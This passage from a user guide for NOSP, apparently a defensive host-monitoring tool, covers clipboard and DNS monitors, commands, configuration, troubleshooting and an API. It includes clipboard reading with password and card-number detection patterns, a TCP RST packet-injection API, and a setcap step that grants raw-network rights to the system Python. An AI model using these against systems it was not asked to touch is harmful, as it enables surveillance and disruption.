    
    # Check for sensitive patterns
    if 'password' in data['content'].lower():
        print("  [ALERT] Possible password in clipboard!")
    
    if re.match(r'\d{16}', data['content']):
        print("  [ALERT] Possible credit card number!")

# Start monitoring
cm.start_monitoring(callback=clipboard_callback)
```

### 18. DNS Cache Monitor (Windows Only)

**Purpose:** Monitor DNS resolution cache for malicious domains.

```python
from python.nosp.dns_monitor import DNSCacheMonitor

# Initialize monitor
dns_mon = DNSCacheMonitor()

# Get current DNS cache
cache = dns_mon.get_cache()

print("Current DNS Cache:")
for entry in cache:
    print(f"  {entry['hostname']} -> {entry['ip']}")
    
    # Check against threat intelligence
    if dns_mon.is_malicious(entry['hostname']):
        print(f"    [ALERT] Known malicious domain!")

# Monitor for changes
dns_mon.start_monitoring(callback=lambda entry: print(f"New DNS resolution: {entry}"))
```

**Manual DNS Cache Viewing:**

```batch
REM View DNS cache
ipconfig /displaydns

REM Clear DNS cache
ipconfig /flushdns

REM Monitor with PowerShell
while ($true) { Clear-Host; ipconfig /displaydns | Select-String -Pattern "Record Name"; Start-Sleep 5 }
```

---

## Command Reference

### Windows Commands

```batch
REM Launch NOSP
run_nosp.bat
python main.py

REM Setup/Install
setup.bat

REM Update dependencies
pip install -r requirements.txt --upgrade

REM Build Rust components
cargo build --release

REM Run tests
pytest tests/ -v

REM Generate documentation
python -m pydoc -w python.nosp

REM Database operations
python -c "from python.nosp.database import NOSPDatabase; db = NOSPDatabase(); print(db.get_statistics())"

REM Export events
python -c "from python.nosp.database import NOSPDatabase; db = NOSPDatabase(); events = db.get_recent_events(100); import json; print(json.dumps(events, indent=2))" > events.json
```

### Linux Commands

```bash
# Launch NOSP
./run_nosp.sh
sudo python3 main.py

# Setup/Install
chmod +x setup.sh
./setup.sh

# Update dependencies
pip3 install -r requirements.txt --upgrade

# Build native modules
cd native/c
make clean && make
cd ../..

# Build Rust components
cargo build --release

# Run tests
pytest tests/ -v

# Generate documentation
python3 -m pydoc -w python.nosp

# Database operations
python3 -c "from python.nosp.database import NOSPDatabase; db = NOSPDatabase(); print(db.get_statistics())"

# Export events
python3 -c "from python.nosp.database import NOSPDatabase; db = NOSPDatabase(); events = db.get_recent_events(100); import json; print(json.dumps(events, indent=2))" > events.json

# System service installation
sudo cp nosp.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable nosp
sudo systemctl start nosp
```

---

## Advanced Configuration

### Configuration Files

**`config.yaml` - Main Configuration**

```yaml
nosp:
  version: "vAPEX"
  loglevel: "INFO"  # DEBUG, INFO, WARNING, ERROR
  
  database:
    path: "nosp_events.db"
    max_size_mb: 1024
    auto_vacuum: true
  
  monitoring:
    process_monitor: true
    network_monitor: true
    file_monitor: true
    etw_monitor: true  # Windows only
    registry_monitor: true  # Windows only
    
  performance:
    max_events_per_second: 1000
    buffer_size: 10000
    worker_threads: 4
  
  ui:
    theme: "dark"
    refresh_rate_ms: 500
    max_timeline_events: 5000
```

### Environment Variables

**Windows:**

```batch
REM Set configuration directory
set NOSP_CONFIG_DIR=C:\ProgramData\NOSP

REM Set log level
set NOSP_LOG_LEVEL=DEBUG

REM Disable specific monitors
set NOSP_DISABLE_ETW=1

REM Custom database path
set NOSP_DB_PATH=D:\NOSP\events.db
```

**Linux:**

```bash
# Set configuration directory
export NOSP_CONFIG_DIR=/etc/nosp

# Set log level
export NOSP_LOG_LEVEL=DEBUG

# Disable specific monitors
export NOSP_DISABLE_FILE_MONITOR=1

# Custom database path
export NOSP_DB_PATH=/var/lib/nosp/events.db
```

---

## Troubleshooting

### Common Issues - Windows

**1. "ETW Monitor failed to start"**

```batch
REM Run as Administrator
REM Right-click run_nosp.bat -> Run as administrator

REM Or verify UAC is enabled
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
```

**2. "High CPU usage"**

```yaml
# Reduce monitoring frequency in config.yaml
performance:
  refresh_rate_ms: 1000  # Increase from 500
  max_events_per_second: 500  # Reduce from 1000
```

**3. "Database locked error"**

```batch
REM Close other NOSP instances
taskkill /F /IM python.exe /FI "WINDOWTITLE eq NOSP*"

REM Or delete lock file
del nosp_events.db-wal
del nosp_events.db-shm
```

### Common Issues - Linux

**1. "Permission denied - packet capture"**

```bash
# Run with sudo
sudo python3 main.py

# Or set capabilities (avoid running as root)
sudo setcap cap_net_raw,cap_net_admin+eip /usr/bin/python3
python3 main.py
```

**2. "native_bindings module not found"**

```bash
# Recompile native modules
cd native/c
make clean
make
cd ../..

# Verify .so files exist
ls -lh native/c/*.so
```

**3. "GUI not displaying"**

```bash
# Install X11 dependencies
sudo apt install python3-pyqt5 libqt5gui5

# For headless servers, use VNC
sudo apt install tightvncserver
vncserver :1
export DISPLAY=:1
python3 main.py
```

### Debug Mode

**Enable Detailed Logging:**

```python
# debug_session.py

import logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('nosp_debug.log'),
        logging.StreamHandler()
    ]
)

from python.nosp import *

# All module operations now log verbosely
```

---

## Performance Tuning

### High-Volume Environments

**Optimize for >10,000 events/second:**

```yaml
# config.yaml
performance:
  max_events_per_second: 15000
  buffer_size: 50000
  worker_threads: 8
  batch_insert: true
  batch_size: 1000

database:
  path: "nosp_events.db"
  journal_mode: "WAL"
  synchronous: "NORMAL"
  cache_size_mb: 512
```

### Low-Resource Systems

**Optimize for minimal resource usage:**

```yaml
# config.yaml
performance:
  max_events_per_second: 100
  buffer_size: 1000
  worker_threads: 2

monitoring:
  process_monitor: true
  network_monitor: true
  file_monitor: false
  etw_monitor: false
```

### Database Maintenance

**Windows:**

```batch
REM Vacuum database
python -c "from python.nosp.database import NOSPDatabase; db = NOSPDatabase(); db.vacuum()"

REM Export and cleanup old events
python -c "from python.nosp.database import NOSPDatabase; db = NOSPDatabase(); db.cleanup_old_events(days=30)"
```

**Linux:**

```bash
# Vacuum database
python3 -c "from python.nosp.database import NOSPDatabase; db = NOSPDatabase(); db.vacuum()"

# Export and cleanup old events
python3 -c "from python.nosp.database import NOSPDatabase; db = NOSPDatabase(); db.cleanup_old_events(days=30)"
```

---

## API Reference

### Python API

**Risk Scorer:**

```python
from python.nosp.risk_scorer import RiskScorer

scorer = RiskScorer()
score, factors = scorer.calculate_risk(event_dict)
```

**Database:**

```python
from python.nosp.database import NOSPDatabase

db = NOSPDatabase('path/to/db.db')
db.insert_event(event, risk_score, risk_factors)
events = db.get_recent_events(limit=100)
db.close()
```

**Forensics:**

```python
from python.nosp.forensics import ForensicsEngine

fe = ForensicsEngine()
report = fe.investigate_process(pid)
fe.export_report(report, format='json', output='report.json')
```

**Packet Capture:**

```python
from python.nosp.native_bindings import PacketCapture

pc = PacketCapture('eth0')
pc.set_filter('tcp port 80')
packets = pc.start_capture(packet_count=100)
pc.export_pcap('capture.pcap')
```

**Packet Injection:**

```python
from python.nosp.native_bindings import PacketInjector

pi = PacketInjector()
pi.inject_tcp_rst(src_ip, src_port, dst_ip, dst_port, seq_num)
pi.kill_connection_bidirectional(src_ip, src_port, dst_ip, dst_port, seq1, seq2)
```

---

## Conclusion

This guide covers all 18 features of NOSP vAPEX with complete examples for both Windows and Linux. For additional support, see:

- **GitHub Issues:** https://github.com/4fqr/nosp/issues
- **Documentation:** README.md, TECHNICAL_DOCS.md
- **Feature Status:** FEATURE_STATUS.md

---

**License:** MIT  
**Version:** vAPEX  
**Last Updated:** 2026-02-08
